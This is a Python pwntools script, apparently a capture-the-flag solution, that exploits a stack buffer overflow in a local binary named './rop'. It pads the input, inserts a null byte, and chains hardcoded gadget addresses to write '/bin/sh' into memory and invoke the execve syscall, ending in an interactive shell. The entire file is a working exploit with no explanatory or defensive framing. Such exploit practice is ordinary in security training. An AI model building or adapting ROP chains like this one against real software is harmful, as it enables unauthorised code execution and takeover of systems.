#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *


p = process("./rop")
context.arch = "amd64"

p.recvuntil("\n")

payload = "A"*29 + "\x00" + cyclic(10)


##################################
# GadGet

pop_rax = 0x000000000044f6cc
pop_rdi = 0x00000000004014f6
pop_rsi = 0x0000000000401617
pop_rdx = 0x00000000004429f6

mov_prdi_rdx = 0x00000000004355f3
buf = 0x6cbb60

syscall = 0x00000000004673c5

##################################

# rax OK
payload += flat([pop_rax, 0x3b])
# rdi OK
payload += flat([pop_rdi, buf, pop_rdx, "/bin/sh\x00", mov_prdi_rdx])
# rsi rdx OK
payload += flat([pop_rsi, 0, pop_rdx, 0])
# syscall
payload += flat([syscall])

p.sendline(payload)
p.interactive()
